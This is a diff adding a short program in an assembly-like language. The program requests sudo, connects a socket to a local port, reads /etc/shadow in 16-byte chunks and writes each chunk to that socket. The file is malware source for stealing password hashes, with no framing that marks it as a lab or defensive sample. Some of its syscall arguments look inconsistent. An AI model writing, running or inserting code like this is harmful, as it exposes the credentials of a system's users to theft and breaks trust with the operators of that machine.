@@ -1,0 +1,38 @@
+!link stdlib/network.mkpk
+!link stdlib/syscall.mkpk
+!link stdlib/shell.mkpk
+!requires_sudo true
+
+[[data]]
+PORT: 0xb315
+LOCALHOST_ADDR: 0x0100007f
+SHADOW_FILE: "/etc/shadow"
+buffer_size: 16
+
+[[code]]
+[main]
+# Setup the network socket
+> sys_socket ${AF_INET} ${SOCK_STREAM} 0x0
+mov r9, rax
+> sockaddr_init "LOCALHOST_ADDR" "PORT" ${AF_INET}
+> sys_connect r9 rsp 0x10
+
+# Open the /etc/shadow file.
+> sys_open "SHADOW_FILE" ${O_RDONLY}
+mov r10, rax
+js exit
+
+read_buffer:
+> sys_read r10 ${buffer_size}
+
+# If rax == 0.
+test rax, rax
+jz exit
+
+# Write the network file descriptor
+> sys_write rsp ${buffer_size} r9
+
+jmp read_buffer
+
+exit:
+> sys_exit
